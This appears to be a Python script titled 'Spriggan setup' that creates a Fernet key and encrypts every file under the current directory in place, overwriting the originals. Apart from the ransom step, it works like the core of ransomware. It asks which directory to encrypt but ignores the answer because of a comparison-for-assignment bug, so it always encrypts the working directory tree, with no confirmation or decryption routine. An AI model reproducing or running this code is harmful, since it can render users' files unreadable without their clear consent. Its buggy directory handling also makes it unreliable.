import pyfiglet
import termcolor
from cryptography.fernet import Fernet
import os
from os.path import isfile
from os import listdir

def generateKey():
    key = Fernet.generate_key()
    with open("key.key", "wb") as key_file:
        key_file.write(key)

def readKey():
    return open("key.key", "rb").read()

text = pyfiglet.figlet_format("Spriggan")

# Aplica colores
colored_text = termcolor.colored(text, color="magenta", attrs=["bold"])

# Muestra el texto
print(colored_text)

print(termcolor.colored("Welcome to Spriggan setup!", color="magenta"))
input(termcolor.colored("\nPress any key to continue ", color="magenta"))

directory = input(termcolor.colored("\nEnter the main directory to be encrypted (leave blank to use the current one): ", color="yellow"))
if directory == "":
    directory == os.getcwd()


generateKey()
key = readKey()

for root, dirs, files in os.walk(os.getcwd()):
    for file in files:
        # Omite "setup.py" y "key.key"
        if file not in ["setup.py", "key.key"]:

            filePath = os.path.join(root, file)

            contents = open(filePath, "rb").read()
            f = Fernet(key)

            contents = f.encrypt(contents)

            with open(filePath, "wb") as targetFile:
                targetFile.write(contents)



# for file in os.listdir(os.getcwd()):

#     filePath = os.getcwd() + "/" + file
    
#     if isfile(filePath) and os.path.basename(file) != "setup.py" and os.path.basename(file) != "key.key":
#         contents = open(filePath, "rb").read()
#         f = Fernet(key)

#         contents = f.encrypt(contents)
#         print(file)
#         with open(filePath, "wb") as targetFile:
#             targetFile.write(contents)